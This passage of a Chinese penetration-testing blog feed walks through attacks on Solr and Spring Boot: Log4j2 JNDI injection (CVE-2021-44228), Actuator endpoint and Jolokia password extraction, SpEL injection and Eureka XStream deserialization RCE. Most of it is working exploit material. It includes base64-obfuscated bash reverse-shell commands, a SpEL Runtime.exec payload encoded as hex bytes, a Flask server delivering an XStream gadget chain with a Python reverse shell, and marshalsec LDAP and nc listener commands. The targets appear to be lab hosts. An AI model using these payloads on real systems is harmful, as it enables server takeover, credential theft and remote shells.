href="http://www.callback.red/">www.callback.red/</a></p><blockquote><p>${jndi:ldap:&#x2F;&#x2F;9xovk0.dnslog.cn}</p></blockquote><blockquote><p>${jndi:ldap:&#x2F;&#x2F;${sys:java.version}.vebwc2.dnslog.cn}</p></blockquote><blockquote><p><a href="http://IP地址:端口/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.vebwc2.dnslog.cn}">http://IP地址:端口/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.vebwc2.dnslog.cn}</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231646952.png" alt="image-20240120231646952"></p><p>发现已经被解析了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231715299.png" alt="image-20240120231715299"></p><p>说明存在漏洞</p><p>现在我想测试处java的版本，只需要利用上问提到的log4j2相关的变量就可以了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231932985.png" alt="image-20240120231932985"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231926897.png" alt="image-20240120231926897"></p><h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ol><li><p>这个是使用gndi注入利用的</p></li><li><p>启动http服务，该目录下有exploit.class</p></li><li><p>启动ldap服务</p><p>直接执行反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://120.27.61.239:8000/#Exploit&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure></li><li><p>监听端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">22345</span><br></code></pre></td></tr></table></figure></li><li><p>使用jndi  ldap协议访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.128</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.168.79.1:9999/</span>Exploit&#125;<br></code></pre></td></tr></table></figure><p>访问的是开启了ldap服务的地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120233645712.png" alt="image-20240120233645712"></p></li><li><p>成功反弹</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120233711167.png" alt="image-20240120233711167"></p></li></ol><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用fastjson的工具，自动化生成一个ldap服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp fastjson_tool.jar fastjson.HLDAPServer <span class="hljs-number">192.168.79.1</span> <span class="hljs-number">9999</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234927739.png" alt="image-20240120234927739"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234948111.png" alt="image-20240120234948111"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234958286.png" alt="image-20240120234958286"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/welk1n/</span>JNDI-Injection-Exploit<span class="hljs-regexp">/releases/</span>tag/v1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>直接使用工具</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar .\JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="hljs-number">192.168.79.1</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240121000137942.png" alt="image-20240121000137942"></p><p>复制直接用，我测试的时候是需要等一下，不知道为什么</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot</title>
    <link href="/2024/01/20/%E6%B8%97%E9%80%8F/SpringBoot/"/>
    <url>/2024/01/20/%E6%B8%97%E9%80%8F/SpringBoot/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="SpringBoot简绍"><a href="#SpringBoot简绍" class="headerlink" title="SpringBoot简绍"></a>SpringBoot简绍</h2><pre><code class="hljs">x</code></pre><blockquote><p>Spring是java web里非常常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring BootActuators反序列化</p></blockquote><h2 id="Actuator简绍"><a href="#Actuator简绍" class="headerlink" title="Actuator简绍"></a>Actuator简绍</h2><blockquote><p>Spring Boot 是 Spring 框架的扩展。Actuator 是 Springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator，开发者可以很方便地对应用系统的某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（ endpoints ）来获取应用系统中的监控信息。</p></blockquote><h2 id="常见的端点信息"><a href="#常见的端点信息" class="headerlink" title="常见的端点信息"></a>常见的端点信息</h2><p><a href="https://blog.csdn.net/yulu32/article/details/115093675">SpringBoot项目端点配置_spring boot2.4 endpoint配置-CSDN博 客</a></p><h2 id="路由信息"><a href="#路由信息" class="headerlink" title="路由信息"></a>路由信息</h2><p>有些程序员会自定义 &#x2F;manage 、&#x2F;management 、项目 App 相关名称为 spring 根路径Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 &#x2F; ，2.x 版本则统一以 &#x2F;actuator 为起始路径Spring Boot Actuator 默认的内置路由名字，如 &#x2F;env 有时候也会被程序员修改，比如修改成&#x2F;appenv</p><h1 id="SpringBoot漏洞发现"><a href="#SpringBoot漏洞发现" class="headerlink" title="SpringBoot漏洞发现"></a>SpringBoot漏洞发现</h1><ol><li><p>框架发现，使用浏览器插件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120095345009.png" alt="image-20240120095345009"></p></li><li><p>或者是小绿叶，报错</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120095454332.png" alt="image-20240120095454332"></p></li></ol><h1 id="SpringBoot信息收集"><a href="#SpringBoot信息收集" class="headerlink" title="SpringBoot信息收集"></a>SpringBoot信息收集</h1><h2 id="路由地址及接口调用详情泄漏"><a href="#路由地址及接口调用详情泄漏" class="headerlink" title="路由地址及接口调用详情泄漏"></a>路由地址及接口调用详情泄漏</h2><blockquote><p>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全” 来<br>讲，不暴露出这些信息更加安全。<br>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是<br>否存在未授权访问、越权等其他业务类型漏洞。</p></blockquote><p>其他一些可能会遇到的swagger、swagger codegen、swagger-dubbo等相关接口路由</p><blockquote><p>&#x2F;swagger<br>&#x2F;api-docs<br>&#x2F;api.html<br>&#x2F;swagger-ui<br>&#x2F;swagger&#x2F;codes<br>&#x2F;api&#x2F;index.html<br>&#x2F;api&#x2F;v2&#x2F;api-docs<br>&#x2F;v2&#x2F;swagger.json<br>&#x2F;swagger-ui&#x2F;html<br>&#x2F;distv2&#x2F;index.html<br>&#x2F;swagger&#x2F;index.html<br>&#x2F;sw&#x2F;swagger-ui.html<br>&#x2F;api&#x2F;swagger-ui.html<br>&#x2F;static&#x2F;swagger.json<br>&#x2F;user&#x2F;swagger-ui.html<br>&#x2F;swagger-ui&#x2F;index.html<br>&#x2F;swagger-dubbo&#x2F;api-docs<br>&#x2F;template&#x2F;swagger-ui.html<br>&#x2F;swagger&#x2F;static&#x2F;index.html<br>&#x2F;dubbo-provider&#x2F;distv2&#x2F;index.html<br>&#x2F;spring-security-rest&#x2F;api&#x2F;swagger-ui.html<br>&#x2F;spring-security-oauth-resource&#x2F;swagger-ui.html</p><p>&#x2F;mappings<br>&#x2F;metrics<br>&#x2F;beans<br>&#x2F;configprops<br>&#x2F;actuator&#x2F;metrics<br>&#x2F;actuator&#x2F;mappings<br>&#x2F;actuator&#x2F;beans<br>&#x2F;actuator&#x2F;configprops</p></blockquote><p>发现是SpringBoot搭建的网站之后，尝试去使用dirsearch等目录扫描工具扫一下，或者是使用专门的工具扫描</p><p><a href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120105235967.png" alt="image-20240120105235967"></p><p>发现有&#x2F;env所以推测这个是1.x版本的</p><p>然后尝试访问，在这个页面寻找密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120105415667.png" alt="image-20240120105415667"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120105430622.png" alt="image-20240120105430622"></p><p>有可能会存在明文的密码，这个加密了是应为前面存在password</p><p>但是这个是有办法解决的</p><ol><li><p>访问目标&#x2F;jolokia或&#x2F;actuator&#x2F;jolokia接口</p><p>目标使用了 jolokia-core 依赖（版本要求暂未知）</p></li><li><p>spring 1.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /jolokia<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;</span>,<span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;getProperty&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;security.user.password&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /jolokia<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;</span>,<span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;getProperty&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;security.user.password&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120111400034.png" alt="image-20240120111400034"></p></li></ol><h2 id="其他信息获取"><a href="#其他信息获取" class="headerlink" title="其他信息获取"></a>其他信息获取</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120111535106.png" alt="image-20240120111535106"></p><h1 id="springboot-spel-rce"><a href="#springboot-spel-rce" class="headerlink" title="springboot-spel-rce"></a>springboot-spel-rce</h1><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120112914143.png" alt="image-20240120112914143"></p><p>这里有一个网页，他会显示看过的书，然后剩余的书，这个可能出现在新闻之内的地方</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ol><li><p>发现是否存在漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120113131631.png" alt="image-20240120113131631"></p><p>发现存在漏洞</p></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于java的对象都是在内存利用，我们要利用的话，我们可以尝试将代码变成java字节码的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>target = <span class="hljs-string">&#x27;touch /tmp/mingy&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> target:<br>    result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x)) + <span class="hljs-string">&quot;,&quot;</span><br><span class="hljs-built_in">print</span>(result.rstrip(<span class="hljs-string">&#x27;,&#x27;</span>))<br></code></pre></td></tr></table></figure><p>然后这我们换成反弹shell的指令</p><p><a href="https://www.sqlsec.com/rce/">https://www.sqlsec.com/rce/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>target = <span class="hljs-string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8xMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> <span class="hljs-comment"># rce</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> target:<br>    result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x)) + <span class="hljs-string">&quot;,&quot;</span><br><span class="hljs-built_in">print</span>(result.rstrip(<span class="hljs-string">&#x27;,&#x27;</span>))<br></code></pre></td></tr></table></figure><p>然后发送</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.79</span><span class="hljs-number">.128</span>:<span class="hljs-number">9091</span>/article/?id=$&#123;T(java<span class="hljs-number">.</span>lang<span class="hljs-number">.</span>Runtime).getRuntime().exec(new String(new <span class="hljs-built_in">byte</span>[]&#123;<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x7d</span>&#125;))&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120114505416.png" alt="image-20240120114505416"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120114511885-17057223150031.png" alt="image-20240120114511885"></p><h1 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>可以POST请求目标网站的&#x2F;env接口设置属性</li><li>可以POST请求目标网站的&#x2F;refresh接口刷新配置（存在spring-boot-starter-actuator依赖)</li><li>目标使用的eureka-client&lt;1.8.7(通常包含在spring-cloud-starter-netflix-eureka-client依赖中)</li><li>目标可以请求攻击者的HTTP服务器（请求可出外网）</li></ol><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="准备一个响应恶意-XStream-payload-的网站"><a href="#准备一个响应恶意-XStream-payload-的网站" class="headerlink" title="准备一个响应恶意 XStream payload 的网站"></a>准备一个响应恶意 XStream payload 的网站</h3><p>这里就使用flask搭建一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">catch_all</span>(<span class="hljs-params">path</span>):<br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span><br><span class="hljs-string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="hljs-string">      &lt;dataHandler&gt;</span><br><span class="hljs-string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="hljs-string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="hljs-string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="hljs-string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="hljs-string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="hljs-string">                    &lt;command&gt;</span><br><span class="hljs-string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;-c&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.79.138&quot;,22345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&lt;/string&gt;</span><br><span class="hljs-string">                    &lt;/command&gt;</span><br><span class="hljs-string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="hljs-string">                  &lt;/next&gt;</span><br><span class="hljs-string">                &lt;/iter&gt;</span><br><span class="hljs-string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="hljs-string">                  &lt;method&gt;</span><br><span class="hljs-string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="hljs-string">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="hljs-string">                    &lt;parameter-types/&gt;</span><br><span class="hljs-string">                  &lt;/method&gt;</span><br><span class="hljs-string">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="hljs-string">                &lt;/filter&gt;</span><br><span class="hljs-string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="hljs-string">              &lt;/serviceIterator&gt;</span><br><span class="hljs-string">              &lt;lock/&gt;</span><br><span class="hljs-string">            &lt;/cipher&gt;</span><br><span class="hljs-string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="hljs-string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="hljs-string">          &lt;/is&gt;</span><br><span class="hljs-string">        &lt;/dataSource&gt;</span><br><span class="hljs-string">      &lt;/dataHandler&gt;</span><br><span class="hljs-string">    &lt;/value&gt;</span><br><span class="hljs-string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Response(xml, mimetype=<span class="hljs-string">&#x27;application/xml&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>) <span class="hljs-comment"># 类似于nc 监听的端口</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120224108233.png" alt="image-20240120224108233"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120223749989.png" alt="image-20240120223749989"></p><h3 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h3><p>nc -lvp 22345</p><h3 id="设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="设置 eureka.client.serviceUrl.defaultZone 属性"></a>设置 eureka.client.serviceUrl.defaultZone 属性</h3><p>通过post方式</p><p>pring boot 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http:<span class="hljs-comment">//your-vps-ip/example</span><br></code></pre></td></tr></table></figure><p>pring boot 2.x</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/actuator/</span>env<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="刷新配置"><a href="#刷新配置" class="headerlink" title="刷新配置"></a>刷新配置</h3><p>springboot 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>springboot 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span 